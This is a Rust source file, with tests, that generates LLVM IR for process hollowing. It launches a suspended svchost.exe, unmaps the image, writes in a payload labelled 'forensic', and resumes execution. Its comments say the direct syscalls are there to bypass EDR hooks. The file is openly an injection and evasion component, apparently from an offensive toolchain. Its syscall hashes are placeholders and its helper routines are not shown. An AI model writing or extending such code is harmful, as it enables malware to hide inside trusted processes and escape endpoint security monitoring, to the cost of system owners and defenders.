/// Process hollowing IR emitter.
///
/// Process hollowing creates a legitimate suspended host process
/// (e.g. `svchost.exe`), unmaps its image, and maps the forensic payload
/// in its place.  All system calls go through direct-syscall stubs so
/// EDR user-mode hooks are bypassed.
///
/// Steps emitted:
///   1. NtCreateUserProcess (suspended) — create host
///   2. NtReadVirtualMemory — read PEB.ImageBaseAddress from host
///   3. NtUnmapViewOfSection — unmap host image
///   4. NtAllocateVirtualMemory — allocate space for payload at preferred base
///   5. NtWriteVirtualMemory — write PE headers + sections
///   6. Patch PEB.ImageBaseAddress + thread context RIP
///   7. NtResumeThread — resume, execute payload

pub struct ProcessHollow {
    host_process: String,
}

impl ProcessHollow {
    pub fn new(host_process: &str) -> Self {
        Self { host_process: host_process.to_string() }
    }

    /// Emit LLVM IR skeleton for the process hollowing function.
    pub fn emit_ir(&self) -> String {
        format!(
r#"; ============================================================
; jocky_hollow_process — inject forensic payload via hollowing
; host: {host}
; ============================================================
define i32 @jocky_hollow_process(i8* %payload_base, i64 %payload_size) {{
entry:
  ; resolve SSNs — all calls go direct to avoid EDR hooks
  %ssn_h1 = add i64 0, 111111111
  %ssn_create = call i32 @jocky_resolve_ssn(i64 %ssn_h1)
  %ssn_h2 = add i64 0, 222222222
  %ssn_read   = call i32 @jocky_resolve_ssn(i64 %ssn_h2)
  %ssn_h3 = add i64 0, 333333333
  %ssn_unmap  = call i32 @jocky_resolve_ssn(i64 %ssn_h3)
  %ssn_h4 = add i64 0, 444444444
  %ssn_alloc  = call i32 @jocky_resolve_ssn(i64 %ssn_h4)
  %ssn_h5 = add i64 0, 555555555
  %ssn_write  = call i32 @jocky_resolve_ssn(i64 %ssn_h5)

  ; Step 1: create suspended host process
  %host_path = call i8* @jocky_resolve_host_path(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.host_proc, i64 0, i64 0))
  %h_proc = alloca i8*, align 8
  %h_thread = alloca i8*, align 8
  %create_ret = call i32 @jocky_direct_syscall(i32 %ssn_create, i8* %host_path, i8** %h_proc, i8** %h_thread)
  %proc_handle = load i8*, i8** %h_proc

  ; Step 2: read PEB base from host
  %peb_base = call i64 @jocky_read_peb_imagebase(i8* %proc_handle, i32 %ssn_read)

  ; Step 3: unmap host image
  %unmap_ret = call i32 @jocky_direct_syscall(i32 %ssn_unmap, i8* %proc_handle, i64 %peb_base)

  ; Step 4: allocate at payload preferred base
  %alloc_base = alloca i64, align 8
  store i64 %peb_base, i64* %alloc_base
  %alloc_ret = call i32 @jocky_direct_syscall(
    i32 %ssn_alloc,
    i8* %proc_handle, i64* %alloc_base, i64 0, i64* null, i32 0x3000, i32 0x40
  )
  %mapped_base = load i64, i64* %alloc_base

  ; Step 5: write PE headers + sections
  %write_ret = call i32 @jocky_write_pe_sections(
    i8* %proc_handle, i64 %mapped_base, i8* %payload_base, i64 %payload_size, i32 %ssn_write
  )

  ; Step 6: patch PEB image base + thread RIP
  call void @jocky_patch_peb_and_ctx(i8* %proc_handle, i8* %h_thread, i64 %mapped_base, i32 %ssn_write)

  ; Step 7: resume thread
  %thread_handle = load i8*, i8** %h_thread
  call void @jocky_resume_thread(i8* %thread_handle)

  ret i32 0
}}

@.host_proc = private unnamed_addr constant [20 x i8] c"svchost.exe\00        "
"#,
            host = self.host_process
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_emit_ir_contains_all_steps() {
        let ph = ProcessHollow::new("svchost.exe");
        let ir = ph.emit_ir();
        assert!(ir.contains("jocky_hollow_process"), "function must be defined");
        assert!(ir.contains("jocky_read_peb_imagebase"), "PEB read step");
        assert!(ir.contains("jocky_write_pe_sections"), "PE write step");
        assert!(ir.contains("jocky_resume_thread"), "resume step");
        assert!(ir.contains("ret i32 0"), "function must return");
    }

    #[test]
    fn test_host_process_reflected_in_comment() {
        let ph = ProcessHollow::new("explorer.exe");
        let ir = ph.emit_ir();
        assert!(ir.contains("explorer.exe"), "host process name in comment");
    }
}
